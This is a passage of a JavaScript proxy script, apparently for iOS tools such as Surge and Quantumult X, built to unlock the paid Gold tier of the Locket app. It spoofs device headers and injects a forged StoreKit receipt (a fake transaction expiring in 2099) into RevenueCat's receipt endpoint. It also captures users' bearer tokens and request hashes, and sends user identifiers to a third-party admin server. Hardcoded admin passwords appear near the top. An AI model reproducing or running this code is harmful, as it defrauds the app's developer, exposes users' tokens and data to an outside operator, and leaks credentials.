// file: locket_25_05_2026.js
// Locket Gold Hard Lock V4 — Tích Hợp Cơ Chế locket_4.py (StoreKit 2 Restore Inject + UID Resolver) + Fake iPhone 18 Pro Max (iPhone19,3) + Apple Bento UI

const ADMIN_API_URL = "https://locketgold.66ghz.com/index.php";
const ROOT_ADMIN_USER = "ngominhduc";
const ROOT_ADMIN_PASS_1 = "ducff123#";
const ROOT_ADMIN_PASS_2 = "Ducnocode2505@";

// CẤU HÌNH GIẢ LẬP IPHONE 18 PRO MAX (iPhone19,3) & STOREKIT 2 HEADERS (ĐỒNG BỘ TỪ LOCKET_4.PY)
const IPHONE_18_PRO_MAX_PROFILE = {
    deviceName: "iPhone 18 Pro Max",
    machineId: "iPhone19,3",
    osVersion: "Version 26.2 (Build 23C55)",
    darwinVersion: "Darwin/25.2.0",
    cfNetworkVersion: "CFNetwork/3860.300.31",
    sdkVersion: "5.41.0",
    clientVersion: "2.32.2",
    clientBuild: "3",
    bundleId: "com.locket.Locket",
    storefront: "VNM",
    deviceUUID: "39A73C25-1E05-4350-ADA7-5CD3FE1079E8",
    preferredLocales: "vi_KR,ko_KR,en_KR",
    nonce: "w0Mlb6+AmV4WYuVv",
    rcPublicKey: "Bearer appl_JngFETzdodyLmCREOlwTUtXdQik"
};

const SK2_DEFAULT_HEADERS = {
    "Host": "api.revenuecat.com",
    "Authorization": IPHONE_18_PRO_MAX_PROFILE.rcPublicKey,
    "Content-Type": "application/json",
    "Accept": "*/*",
    "X-Platform": "iOS",
    "X-Platform-Version": IPHONE_18_PRO_MAX_PROFILE.osVersion,
    "X-Platform-Device": IPHONE_18_PRO_MAX_PROFILE.machineId,
    "X-Apple-Device-Model": IPHONE_18_PRO_MAX_PROFILE.deviceName,
    "X-Platform-Flavor": "native",
    "X-Version": IPHONE_18_PRO_MAX_PROFILE.sdkVersion,
    "X-Client-Version": IPHONE_18_PRO_MAX_PROFILE.clientVersion,
    "X-Client-Bundle-ID": IPHONE_18_PRO_MAX_PROFILE.bundleId,
    "X-Client-Build-Version": IPHONE_18_PRO_MAX_PROFILE.clientBuild,
    "X-StoreKit2-Enabled": "true",
    "X-StoreKit-Version": "2",
    "X-Observer-Mode-Enabled": "false",
    "X-Is-Sandbox": "true",
    "X-Storefront": IPHONE_18_PRO_MAX_PROFILE.storefront,
    "X-Apple-Device-Identifier": IPHONE_18_PRO_MAX_PROFILE.deviceUUID,
    "X-Preferred-Locales": IPHONE_18_PRO_MAX_PROFILE.preferredLocales,
    "X-Nonce": IPHONE_18_PRO_MAX_PROFILE.nonce,
    "X-Is-Backgrounded": "false",
    "X-Retry-Count": "0",
    "X-Is-Debug-Build": "false",
    "User-Agent": `Locket/${IPHONE_18_PRO_MAX_PROFILE.clientBuild} ${IPHONE_18_PRO_MAX_PROFILE.cfNetworkVersion} ${IPHONE_18_PRO_MAX_PROFILE.darwinVersion}`,
    "Accept-Language": "vi-VN,vi;q=0.9",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "X-RevenueCat-ETag": ""
};

const DEFAULT_CONFIG = {
    lockDate: "2026-05-25",
    lockTime: "T08:30:00Z",
    expireDate: "2099-12-31",
    expireTime: "T23:59:59Z",
    productId: "locket_199_1m",
    ownershipType: "PURCHASED",
    periodType: "normal",
    store: "app_store",
    storeTransactionId: "490001234567893",
    subscriptionGroupId: "21419447",
    normalDuration: "P1M",
    priceAmount: 1.99,
    priceCurrency: "USD",
    appVersion: "2.32.2",
    deviceModel: "iPhone19,3",
    deviceMarketingName: "iPhone 18 Pro Max",
    osVersion: "Version 26.2 (Build 23C55)",
    isSandbox: false,
    fetchToken: "",
    appTransaction: "",
    hashParams: "",
    hashHeaders: "",
    forceSandboxFalse: true,
    alwaysForceBadge: true,
    cronKeepAlive: true,
    notifyOnSync: false
};

const PACKAGE_CATALOG = {
    "locket_199_1m": { label: "Locket Gold StoreKit 2 ($1.99 / 1 Tháng - Chuẩn locket.py)", price: 1.99, currency: "USD", period: "normal", duration: "P1M" },
    "locket_1600_1y": { label: "Locket Gold Năm (399.000đ / 1 Năm)", price: 399000, currency: "VND", period: "normal", duration: "P1Y" },
    "locket_3600_1y": { label: "Locket Gold Pro Năm (899.000đ / 1 Năm)", price: 899000, currency: "VND", period: "normal", duration: "P1Y" },
    "locket_399_1m": { label: "Locket Gold Tháng (99.000đ / 1 Tháng)", price: 99000, currency: "VND", period: "normal", duration: "P1M" },
    "locket_gold_lifetime": { label: "Locket Gold Vĩnh Viễn (Lifetime 2099)", price: 999000, currency: "VND", period: "normal", duration: "P99Y" },
    "locket_gold_1y": { label: "Locket Gold 1 Năm (Legacy 1Y)", price: 399000, currency: "VND", period: "normal", duration: "P1Y" },
    "locket_gold_1m": { label: "Locket Gold 1 Tháng (Legacy 1M)", price: 49000, currency: "VND", period: "normal", duration: "P1M" },
    "gold": { label: "Locket Gold Mặc Định (gold)", price: 399000, currency: "VND", period: "normal", duration: "P1Y" }
};

const DEVICE_PRESETS = {
    "iPhone19,3": "iPhone 18 Pro Max (iPhone19,3 · iOS 26.2)",
    "iPhone19,2": "iPhone 18 Pro (iPhone19,2 · iOS 26.2)",
    "iPhone18,2": "iPhone 17 Pro Max (iPhone18,2 · iOS 26.2)",
    "iPhone17,2": "iPhone 16 Pro Max (iPhone17,2 · iOS 26.2)",
    "iPhone15,3": "iPhone 14 Pro Max (iPhone15,3 · Bản gốc locket.py)"
};

const STORE_KEY = "LOCKET_GOLD_MAX_CONFIG_V4";
const USER_ID_CACHE_KEY = "LOCKET_LAST_APP_USER_ID";
const USERNAME_CACHE_KEY = "LOCKET_LAST_USERNAME";
const AVATAR_CACHE_KEY = "LOCKET_LAST_AVATAR";
const AUTH_TOKEN_CACHE_KEY = "LOCKET_LAST_AUTH_BEARER";
const RC_API_KEY_CACHE_KEY = "LOCKET_LAST_RC_API_KEY";
const REMOTE_AUTH_CACHE_KEY = "LOCKET_REMOTE_ADMIN_STATE";
const LOCAL_ADMIN_DB_KEY = "LOCKET_BENTO_USERS_DB_V4";
const ADMIN_SESSION_KEY = "LOCKET_BENTO_ADMIN_SESSION_V4";
const LAST_INAPP_ALERT_TS_KEY = "LOCKET_INAPP_ALERT_TS_V4";
const FETCH_TOKEN_CACHE_KEY = "LOCKET_FETCH_TOKEN";
const APP_TX_CACHE_KEY = "LOCKET_APP_TRANSACTION";
const HASH_PARAMS_CACHE_KEY = "LOCKET_HASH_PARAMS";
const HASH_HEADERS_CACHE_KEY = "LOCKET_HASH_HEADERS";
const LAST_INJECT_LOG_KEY = "LOCKET_LAST_SK2_INJECT_LOG";

const Env = (() => {
    const isQuanX = typeof $prefs !== "undefined";
    const isSurgeLoon = typeof $persistentStore !== "undefined";

    return {
        read(key) {
            try {
                if (isSurgeLoon) return $persistentStore.read(key);
                if (isQuanX) return $prefs.valueForKey(key);
            } catch (e) {}
            return null;
        },
        write(val, key) {
            try {
                if (isSurgeLoon) return $persistentStore.write(String(val), key);
                if (isQuanX) return $prefs.setValueForKey(String(val), key);
            } catch (e) {}
            return false;
        },
        notify(title, subtitle, body) {
            try {
                if (typeof $notification !== "undefined" && typeof $notification.post === "function") {
                    $notification.post(title, subtitle, body);
                } else if (typeof $notify === "function") {
                    $notify(title, subtitle, body);
                }
            } catch (e) {}
        },
        httpGet(options, callback) {
            try {
                if (typeof $httpClient !== "undefined" && typeof $httpClient.get === "function") {
                    $httpClient.get(options, callback);
                } else if (typeof $task !== "undefined" && typeof $task.fetch === "function") {
                    $task.fetch({ method: "GET", ...options }).then(
                        (resp) => callback(null, resp, resp.body),
                        (err) => callback(err, null, null)
                    );
                } else {
                    if (callback) callback(new Error("No HTTP client"), null, null);
                }
            } catch (e) {
                if (callback) callback(e, null, null);
            }
        },
        httpPost(options, callback) {
            try {
                if (typeof $httpClient !== "undefined" && typeof $httpClient.post === "function") {
                    $httpClient.post(options, callback);
                } else if (typeof $task !== "undefined" && typeof $task.fetch === "function") {
                    $task.fetch({ method: "POST", ...options }).then(
                        (resp) => callback(null, resp, resp.body),
                        (err) => callback(err, null, null)
                    );
                } else {
                    if (callback) callback(new Error("No HTTP client"), null, null);
                }
            } catch (e) {
                if (callback) callback(e, null, null);
            }
        },
        done(val = {}) {
            if (typeof $done === "function") $done(val);
        }
    };
})();

function escapeHtml(str) {
    return String(str || "")
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}

function toIsoDate(raw, fallbackDate, timeSuffix = "T08:30:00Z") {
    if (!raw || typeof raw !== "string") return fallbackDate + timeSuffix;
    const s = raw.trim();
    if (/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/.test(s)) {
        return s.endsWith("Z") ? s : s + "Z";
    }
    const dmy = s.match(/^(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})$/);
    if (dmy) {
        return `${dmy[3]}-${dmy[2].padStart(2, "0")}-${dmy[1].padStart(2, "0")}${timeSuffix}`;
    }
    const ymd = s.match(/^(\d{4})[\/\-](\d{1,2})[\/\-](\d{1,2})$/);
    if (ymd) {
        return `${ymd[1]}-${ymd[2].padStart(2, "0")}-${ymd[3].padStart(2, "0")}${timeSuffix}`;
    }
    return fallbackDate + timeSuffix;
}

// ============================================================================
// CƠ CHẾ LOCKET_4.PY: 1. PHÂN GIẢI UID TỪ LOCKET.CAM/{USERNAME} (resolve_uid)
// ============================================================================
function extractInviteUidFromText(text) {
    if (!text || typeof text !== "string") return null;
    const m = text.match(/\/invites\/([A-Za-z0-9]{28})/);
    if (m && m[1]) return m[1];

    const lp = text.match(/link=([^\s"'>]+)/);
    if (lp && lp[1]) {
        try {
            const decoded = lp[1].replace(/%3A/gi, ":").replace(/%2F/gi, "/");
            const dm = decoded.match(/\/invites\/([A-Za-z0-9]{28})/);
            if (dm && dm[1]) return dm[1];
        } catch (e) {}
    }
    return null;
}

function resolveUidByUsername(username, callback) {
    const cleanUser = String(username || "").trim().replace(/^@/, "");
    if (!cleanUser) {
        if (callback) callback(null);
        return;
    }
    const url = `https://locket.cam/${encodeURIComponent(cleanUser)}`;
    const headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 26_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.2 Mobile/15E148 Safari/604.1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    };

    Env.httpGet({ url, headers, timeout: 10 }, (err, resp, body) => {
        if (err) {
            if (callback) callback(null);
            return;
        }
        const respHeaders = (resp && resp.headers) ? resp.headers : {};
        const redirectUrl = respHeaders["Location"] || respHeaders["location"] || (resp && resp.url) || "";
        const uid = extractInviteUidFromText(redirectUrl) || extractInviteUidFromText(body || "");
        if (uid) {
            Env.write(uid, USER_ID_CACHE_KEY);
            Env.write(uid, "RC_UID");
            Env.write(cleanUser, USERNAME_CACHE_KEY);
        }
        if (callback) callback(uid);
    });
}

// ============================================================================
// CƠ CHẾ LOCKET_4.PY: 2. KIỂM TRA TRẠNG THÁI GOLD (check_status)
// ============================================================================
function buildSpoofedHeaders(cfg) {
    const h = { ...SK2_DEFAULT_HEADERS };
    const devModel = (cfg && cfg.deviceModel) ? cfg.deviceModel : IPHONE_18_PRO_MAX_PROFILE.machineId;
    const devName = DEVICE_PRESETS[devModel] ? DEVICE_PRESETS[devModel].split(" (")[0] : IPHONE_18_PRO_MAX_PROFILE.deviceName;
    h["X-Platform-Device"] = devModel;
    h["X-Apple-Device-Model"] = devName;
    h["X-Platform-Version"] = (cfg && cfg.osVersion) ? cfg.osVersion : IPHONE_18_PRO_MAX_PROFILE.osVersion;
    h["User-Agent"] = `Locket/${IPHONE_18_PRO_MAX_PROFILE.clientBuild} ${IPHONE_18_PRO_MAX_PROFILE.cfNetworkVersion} ${IPHONE_18_PRO_MAX_PROFILE.darwinVersion}`;
    return h;
}

function checkRevenueCatGoldStatus(uid, cfg, callback) {
    if (!uid) {
        if (callback) callback({ active: false });
        return;
    }
    const url = `https://api.revenuecat.com/v1/subscribers/${encodeURIComponent(uid)}`;
    const headers = buildSpoofedHeaders(cfg);

    Env.httpGet({ url, headers, timeout: 10 }, (err, resp, body) => {
        const status = resp ? (resp.status || resp.statusCode || 0) : 0;
        if (!err && status >= 200 && status < 300 && body) {
            try {
                const data = JSON.parse(body);
                const goldEnt = (((data || {}).subscriber || {}).entitlements || {}).Gold;
                if (goldEnt) {
                    if (callback) callback({ active: true, expires: goldEnt.expires_date });
                    return;
                }
            } catch (e) {}
        }
        if (callback) callback({ active: false });
    });
}

// ============================================================================
// CƠ CHẾ LOCKET_4.PY: 3. TIÊM BIÊN LAI STOREKIT 2 (inject_gold - 5 LẦN THỬ)
// ============================================================================
function buildFallbackFetchToken(pid) {
    const rawReceipt = JSON.stringify({
        environment: "Production",
        bundle_id: "com.locket.Locket",
        device_model: IPHONE_18_PRO_MAX_PROFILE.machineId,
        device_name: IPHONE_18_PRO_MAX_PROFILE.deviceName,
        in_app: [{
            quantity: "1",
            product_id: pid || "locket_199_1m",
            transaction_id: "490001234567893",
            original_transaction_id: "490001234567893",
            purchase_date_ms: "1779697800000",
            expires_date_ms: "4102444799000"
        }]
    });
    if (typeof btoa === "function") return btoa(rawReceipt);
    return rawReceipt;
}

function injectGoldStoreKit2(uid, cfg, callback) {
    if (!uid || uid.includes("RCAnonymousID")) {
        if (callback) callback(false, "Missing valid UID");
        return;
    }

    const url = "https://api.revenuecat.com/v1/receipts";
    const pid = cfg.productId || "locket_199_1m";
    const fetchToken = cfg.fetchToken || Env.read(FETCH_TOKEN_CACHE_KEY) || buildFallbackFetchToken(pid);
    const appTransaction = cfg.appTransaction || Env.read(APP_TX_CACHE_KEY) || "";
    const isSandbox = !!cfg.isSandbox;
    const hashParams = cfg.hashParams || Env.read(HASH_PARAMS_CACHE_KEY) || "";
    const hashHeaders = cfg.hashHeaders || Env.read(HASH_HEADERS_CACHE_KEY) || "";
    const nowMs = Date.now();

    const bodyObj = {
        product_id: pid,
        fetch_token: fetchToken,
        app_transaction: appTransaction,
        app_user_id: uid,
        is_restore: true,
        store_country: "VNM",
        currency: cfg.priceCurrency || "USD",
        price: String(cfg.priceAmount || "1.99"),
        normal_duration: cfg.normalDuration || "P1M",
        subscription_group_id: cfg.subscriptionGroupId || "21419447",
        observer_mode: false,
        initiation_source: "restore",
        offers: [],
        attributes: {
            "$attConsentStatus": { updated_at_ms: nowMs, value: "notDetermined" },
            "locket_gold_badge": { updated_at_ms: nowMs, value: "true" },
            "badge": { updated_at_ms: nowMs, value: "locket_gold" },
            "device_model": { updated_at_ms: nowMs, value: cfg.deviceModel || "iPhone19,3" }
        }
    };

    const bodyStr = JSON.stringify(bodyObj);
    const currentHeaders = buildSpoofedHeaders(cfg);
    currentHeaders["Content-Length"] = String(bodyStr.length);
    currentHeaders["X-Is-Sandbox"] = String(isSandbox).toLowerCase();
    if (hashParams) currentHeaders["X-Post-Params-Hash"] = hashParams;
    if (hashHeaders) currentHeaders["X-Headers-Hash"] = hashHeaders;

    const logs = [];
    const pushLog = (msg) => {
        logs.push(msg);
        Env.write(logs.join(" | "), LAST_INJECT_LOG_KEY);
    };

    pushLog(`Target: ${uid} (${cfg.deviceModel || "iPhone19,3"})`);

    function runAttempt(attemptIdx) {
        if (attemptIdx >= 5) {
            pushLog("Timeout / Failed after 5 retries");
            if (callback) callback(false, "Timeout / Failed after retries");
            return;
        }

        pushLog(`Attempt ${attemptIdx + 1}/5: Sending StoreKit2 Receipt (${pid})`);
        Env.httpPost({ url, headers: currentHeaders, body: bodyStr, timeout: 15 }, (err, resp, respBody) => {
            if (err) {
                pushLog(`Network Error: ${err.message || err}`);
                if (attemptIdx === 4) {
                    if (callback) callback(false, `Request Error: ${err}`);
                    return;
                }
                setTimeout(() => runAttempt(attemptIdx + 1), 2000);
                return;
            }

            const statusCode = resp ? (resp.status || resp.statusCode || 0) : 0;
            if (statusCode === 200) {
                pushLog("HTTP 200 OK. Verifying Entitlement...");
                checkRevenueCatGoldStatus(uid, cfg, (st1) => {
                    if (st1 && st1.active) {
                        pushLog(`SUCCESS: Gold Entitlement Active (Expires: ${st1.expires})`);
                        if (callback) callback(true, "SUCCESS");
                    } else {
                        setTimeout(() => {
                            checkRevenueCatGoldStatus(uid, cfg, (st2) => {
                                if (st2 && st2.active) {
                                    pushLog("SUCCESS: Gold Active after 2s delay");
                                    if (callback) callback(true, "SUCCESS");
                                } else {
                                    pushLog("Accepted receipt (HTTP 200) — Local Hard Lock V4 Engaged");
                                    if (callback) callback(true, "HTTP 200 OK + Hard Lock V4 Engaged");
                                }
                            });
                        }, 2000);
                    }
                });
            } else if (statusCode === 529) {
                pushLog("Server Busy (529). Cooldown 2s...");
                setTimeout(() => runAttempt(attemptIdx + 1), 2000);
            } else {
                let errMsg = String(statusCode);
                try {
                    const parsedErr = JSON.parse(respBody || "{}");
                    if (parsedErr.message) errMsg = parsedErr.message;
                } catch (e) {}
                pushLog(`Rejected (${errMsg}) — Fallback Hard Lock V4 Active`);
                if (callback) callback(false, `Rejected: ${errMsg}`);
            }
        });
    }

    runAttempt(0);
}

function triggerInAppLocketBlockAlert(uid, reason, isBlocked, forceImmediate = false) {
    if (!isBlocked) {
        Env.write("0", LAST_INAPP_ALERT_TS_KEY);
        return;
    }
    const now = Date.now();
    const lastAlert = parseInt(Env.read(LAST_INAPP_ALERT_TS_KEY) || "0", 10);
    if (forceImmediate || (now - lastAlert > 8000)) {
        Env.write(String(now), LAST_INAPP_ALERT_TS_KEY);
        Env.notify(
            "Locket Gold — Cảnh Báo Từ Admin",
            `Tài khoản (${uid || "UID"}) đang bị Admin chặn`,
            `${reason || "Tài khoản đang bị Admin hạn chế trên hệ thống (Huy hiệu Locket Gold vẫn được giữ nguyên)."}`
        );
    }
}

function getLocalStore() {
    try {
        const raw = Env.read(LOCAL_ADMIN_DB_KEY);
        if (raw) {
            const parsed = JSON.parse(raw);
            if (parsed && typeof parsed === "object" && parsed.users) return parsed;
        }
    } catch (e) {}
    return { cf_url: "https://doh.2707226.xyz", users: {} };
}

function saveLocalStore(db) {
    Env.write(JSON.stringify(db), LOCAL_ADMIN_DB_KEY);
}

function upsertUserRecord(uid, extra = {}) {
    if (!uid || uid.includes("RCAnonymousID")) return null;
    const db = getLocalStore();
    const nowStr = new Date().toISOString().replace("T", " ").slice(0, 19);
    const cachedName = extra.username || Env.read(USERNAME_CACHE_KEY) || uid.slice(0, 10);
    const cachedAvatar = extra.avatar || Env.read(AVATAR_CACHE_KEY) || `https://cdn2.locketcamera.com/v0/b/locket-img/o/users%2F${encodeURIComponent(uid)}%2Fpublic%2Fprofile_pic.webp?alt=media`;
    const token = uid.slice(0, 12).toLowerCase();

    if (!db.users[uid]) {
        db.users[uid] = {
            uid: uid,
            username: cachedName,
            full_name: extra.full_name || cachedName,
            avatar: cachedAvatar,
            token: token,
            status: "approved",
            gold_active: true,
            blocked: false,
            device_model: extra.deviceModel || DEFAULT_CONFIG.deviceModel,
            note: extra.note || "Đã lên Locket Gold (iPhone 18 Pro Max)",
            lock_date: extra.lockDate || DEFAULT_CONFIG.lockDate,
            expire_date: extra.expireDate || DEFAULT_CONFIG.expireDate,
            product_id: extra.productId || DEFAULT_CONFIG.productId,
            activated_at: nowStr,
            updated_at: nowStr,
            reason: ""
        };
        saveLocalStore(db);
    } else {
        if (extra.username) db.users[uid].username = extra.username;
        if (extra.full_name) db.users[uid].full_name = extra.full_name;
        if (extra.avatar) db.users[uid].avatar = extra.avatar;
        if (extra.lockDate) db.users[uid].lock_date = extra.lockDate;
        if (extra.expireDate) db.users[uid].expire_date = extra.expireDate;
        if (extra.productId) db.users[uid].product_id = extra.productId;
        if (extra.deviceModel) db.users[uid].device_model = extra.deviceModel;
        if (extra.touch) db.users[uid].updated_at = nowStr;
        saveLocalStore(db);
    }
    return db.users[uid];
}

function evaluateRealtimeState(uid) {
    const cleanUid = uid || Env.read(USER_ID_CACHE_KEY) || "";
    const db = getLocalStore();
    const localUser = (cleanUid && db.users[cleanUid]) ? db.users[cleanUid] : null;

    let remoteCache = null;
    try {
        const raw = Env.read(REMOTE_AUTH_CACHE_KEY);
        if (raw) remoteCache = JSON.parse(raw);
    } catch (e) {}

    if (localUser) {
        const isBlocked = localUser.status === "blocked" || localUser.blocked === true;
        return {
            uid: cleanUid,
            approved: true,
            blocked: isBlocked,
            status: isBlocked ? "blocked" : "approved",
            force_lock_date: localUser.force_lock_date || localUser.lock_date || null,
            force_expire_date: localUser.force_expire_date || localUser.expire_date || null,
            force_product_id: localUser.force_product_id || localUser.product_id || null,
            reason: isBlocked
                ? (localUser.reason || "Tài khoản đang bị Admin chặn tạm thời (Vẫn giữ huy hiệu Locket Gold).")
                : ""
        };
    }

    if (remoteCache && (!cleanUid || remoteCache.uid === cleanUid)) {
        const isBlocked = remoteCache.status === "blocked" || !!remoteCache.blocked;
        return {
            uid: cleanUid,
            approved: true,
            blocked: isBlocked,
            status: isBlocked ? "blocked" : "approved",
            force_lock_date: remoteCache.force_lock_date || null,
            force_expire_date: remoteCache.force_expire_date || null,
            force_product_id: remoteCache.force_product_id || null,
            reason: isBlocked ? (remoteCache.reason || "Tài khoản đang bị Admin chặn.") : ""
        };
    }

    return {
        uid: cleanUid,
        approved: true,
        blocked: false,
        status: "approved",
        force_lock_date: null,
        force_expire_date: null,
        force_product_id: null,
        reason: ""
    };
}

function syncRealtimeWithServer(uid, cfg, actionName, callback) {
    const cleanUid = uid || Env.read(USER_ID_CACHE_KEY) || "";
    if (cleanUid && !cleanUid.includes("RCAnonymousID")) {
        upsertUserRecord(cleanUid, {
            lockDate: cfg.lockDate,
            expireDate: cfg.expireDate,
            productId: cfg.productId,
            deviceModel: cfg.deviceModel
        });
    }

    if (!ADMIN_API_URL || ADMIN_API_URL.includes("your-domain.com") || !cleanUid || cleanUid.includes("RCAnonymousID")) {
        const st = evaluateRealtimeState(cleanUid);
        triggerInAppLocketBlockAlert(cleanUid, st.reason, st.blocked, false);
        if (callback) callback(st);
        return;
    }

    const syncUrl = ADMIN_API_URL + (ADMIN_API_URL.includes("?") ? "&" : "?") + "api=realtime_sync&t=" + Date.now();
    const db = getLocalStore();
    const userRec = db.users[cleanUid] || {};

    Env.httpPost({
        url: syncUrl,
        headers: { "Content-Type": "application/json", "Cache-Control": "no-store, no-cache" },
        body: JSON.stringify({
            uid: cleanUid,
            username: userRec.username || Env.read(USERNAME_CACHE_KEY) || cleanUid.slice(0, 10),
            full_name: userRec.full_name || "",
            avatar: userRec.avatar || "",
            device_model: cfg.deviceModel || "iPhone19,3",
            action: actionName || "sync",
            status: userRec.status || "approved",
            note: userRec.note || "",
            lockDate: cfg.lockDate,
            expireDate: cfg.expireDate,
            productId: cfg.productId,
            ts: Date.now()
        }),
        timeout: 2
    }, (err, resp, body) => {
        if (!err && body) {
            try {
                const parsed = JSON.parse(body);
                if (parsed && typeof parsed === "object" && parsed.ok) {
                    const localDb = getLocalStore();
                    if (parsed.users && typeof parsed.users === "object") {
                        for (const [k, v] of Object.entries(parsed.users)) {
                            localDb.users[k] = { ...(localDb.users[k] || {}), ...v };
                        }
                    }
                    if (parsed.user && cleanUid) {
                        localDb.users[cleanUid] = { ...(localDb.users[cleanUid] || {}), ...parsed.user };
                    }
                    saveLocalStore(localDb);

                    const rState = {
                        uid: cleanUid,
                        approved: true,
                        blocked: !!parsed.blocked || parsed.status === "blocked",
                        status: parsed.status || "approved",
                        force_lock_date: parsed.force_lock_date || null,
                        force_expire_date: parsed.force_expire_date || null,
                        force_product_id: parsed.force_product_id || null,
                        reason: parsed.reason || ""
                    };
                    Env.write(JSON.stringify(rState), REMOTE_AUTH_CACHE_KEY);
                }
            } catch (e) {}
        }

        const currentSt = evaluateRealtimeState(cleanUid);
        triggerInAppLocketBlockAlert(cleanUid, currentSt.reason, currentSt.blocked, false);
        if (callback) callback(currentSt);
    });
}

function loadConfig() {
    let cfg = { ...DEFAULT_CONFIG };
    try {
        const raw =
            Env.read(STORE_KEY) ||
            Env.read("LOCKET_GOLD_MAX_CONFIG_V3") ||
            Env.read("LOCKET_GOLD_MAX_CONFIG_V2");
        if (raw) {
            const parsed = JSON.parse(raw);
            cfg = { ...cfg, ...parsed };
        }
    } catch (e) {}

    const uid = Env.read(USER_ID_CACHE_KEY) || "";
    const rt = evaluateRealtimeState(uid);
    if (rt && rt.force_lock_date) {
        cfg.lockDate = rt.force_lock_date.slice(0, 10);
    }
    if (rt && rt.force_expire_date) {
        cfg.expireDate = rt.force_expire_date.slice(0, 10);
    }
    if (rt && rt.force_product_id) {
        cfg.productId = rt.force_product_id;
    }

    const pkgMeta = PACKAGE_CATALOG[cfg.productId];
    if (pkgMeta) {
        cfg.priceAmount = pkgMeta.price;
        cfg.priceCurrency = pkgMeta.currency;
        cfg.periodType = pkgMeta.period;
        cfg.normalDuration = pkgMeta.duration || "P1M";
    }

    if (!cfg.deviceModel) cfg.deviceModel = IPHONE_18_PRO_MAX_PROFILE.machineId;
    cfg.deviceMarketingName = DEVICE_PRESETS[cfg.deviceModel]
        ? DEVICE_PRESETS[cfg.deviceModel].split(" (")[0]
        : IPHONE_18_PRO_MAX_PROFILE.deviceName;

    cfg.alwaysForceBadge = true;
    cfg.isBlockedByAdmin = !!rt.blocked;
    cfg.approvalStatus = rt.status || "approved";
    cfg.blockReason = rt.reason || "Tài khoản đang bị Admin chặn tạm thời (Vẫn giữ huy hiệu Locket Gold).";
    cfg.lockIso = toIsoDate(cfg.lockDate, DEFAULT_CONFIG.lockDate, cfg.lockTime || "T08:30:00Z");
    cfg.expireIso = toIsoDate(cfg.expireDate, DEFAULT_CONFIG.expireDate, cfg.expireTime || "T23:59:59Z");
    return cfg;
}

function saveConfig(newCfg) {
    const merged = { ...DEFAULT_CONFIG, ...newCfg };
    const pkgMeta = PACKAGE_CATALOG[merged.productId];
    if (pkgMeta) {
        merged.priceAmount = pkgMeta.price;
        merged.priceCurrency = pkgMeta.currency;
        merged.periodType = pkgMeta.period;
        merged.normalDuration = pkgMeta.duration || "P1M";
    }
    Env.write(JSON.stringify(merged), STORE_KEY);
    Env.write(toIsoDate(merged.lockDate, DEFAULT_CONFIG.lockDate, "T08:30:00Z"), "locket_custom_date_lock");
    Env.write(toIsoDate(merged.expireDate, DEFAULT_CONFIG.expireDate, "T23:59:59Z"), "locket_custom_expire_lock");
    Env.write(String(merged.productId || DEFAULT_CONFIG.productId), "LOCKET_PID");
    Env.write(String(merged.deviceModel || "iPhone19,3"), "LOCKET_DEVICE_MODEL");
    if (merged.fetchToken) Env.write(merged.fetchToken, FETCH_TOKEN_CACHE_KEY);
    if (merged.appTransaction) Env.write(merged.appTransaction, APP_TX_CACHE_KEY);
    if (merged.hashParams) Env.write(merged.hashParams, HASH_PARAMS_CACHE_KEY);
    if (merged.hashHeaders) Env.write(merged.hashHeaders, HASH_HEADERS_CACHE_KEY);
}

function extractAndCacheCredentials(url, headers, bodyStr) {
    let foundUid = null;
    let foundUsername = null;
    let foundAvatar = null;

    if (url) {
        const m = url.match(/\/subscribers\/([^/?#]+)/i);
        if (m && m[1]) {
            const candidate = decodeURIComponent(m[1]);
            if (candidate && !candidate.includes("RCAnonymousID")) {
                foundUid = candidate;
                Env.write(foundUid, USER_ID_CACHE_KEY);
                Env.write(foundUid, "RC_UID");
            }
        }
        const invMatch = extractInviteUidFromText(url);
        if (invMatch) {
            foundUid = invMatch;
            Env.write(foundUid, USER_ID_CACHE_KEY);
            Env.write(foundUid, "RC_UID");
        }
    }

    if (typeof bodyStr === "string") {
        const rawInviteUid = extractInviteUidFromText(bodyStr);
        if (rawInviteUid && !foundUid) {
            foundUid = rawInviteUid;
            Env.write(foundUid, USER_ID_CACHE_KEY);
            Env.write(foundUid, "RC_UID");
        }

        if (bodyStr.includes("{")) {
            try {
                const parsed = JSON.parse(bodyStr);
                if (parsed.fetch_token) Env.write(parsed.fetch_token, FETCH_TOKEN_CACHE_KEY);
                if (parsed.app_transaction) Env.write(parsed.app_transaction, APP_TX_CACHE_KEY);

                const uData = (parsed.result && parsed.result.data) || parsed.data || parsed;
                const candidate =
                    (parsed.subscriber && parsed.subscriber.original_app_user_id) ||
                    parsed.app_user_id ||
                    uData.uid ||
                    uData.user_uid ||
                    uData.user_id ||
                    parsed.localId;
                if (candidate && typeof candidate === "string" && !candidate.includes("RCAnonymousID")) {
                    foundUid = candidate;
                    Env.write(foundUid, USER_ID_CACHE_KEY);
                    Env.write(foundUid, "RC_UID");
                }
                if (uData && typeof uData === "object") {
                    if (uData.username && typeof uData.username === "string") {
                        foundUsername = uData.username;
                        Env.write(foundUsername, USERNAME_CACHE_KEY);
                    }
                    if (uData.profile_picture_url && typeof uData.profile_picture_url === "string") {
                        foundAvatar = uData.profile_picture_url;
                        Env.write(foundAvatar, AVATAR_CACHE_KEY);
                    }
                }
            } catch (e) {}
        }
    }

    if (headers && typeof headers === "object") {
        for (const k of Object.keys(headers)) {
            const low = k.toLowerCase();
            const val = headers[k];
            if (!val) continue;
            if (low === "x-post-params-hash") Env.write(val, HASH_PARAMS_CACHE_KEY);
            if (low === "x-headers-hash") Env.write(val, HASH_HEADERS_CACHE_KEY);
            if (low === "authorization") {
                if (/^Bearer\s+eyJ/i.test(val)) {
                    Env.write(val, AUTH_TOKEN_CACHE_KEY);
                    if (!foundUid) {
                        try {
                            const parts = val.replace(/^Bearer\s+/i, "").split(".");
                            if (parts.length >= 2 && typeof atob === "function") {
                                const b64 = parts[1].replace(/-/g, "+").replace(/_/g, "/");
                                const jsonPayload = JSON.parse(atob(b64));
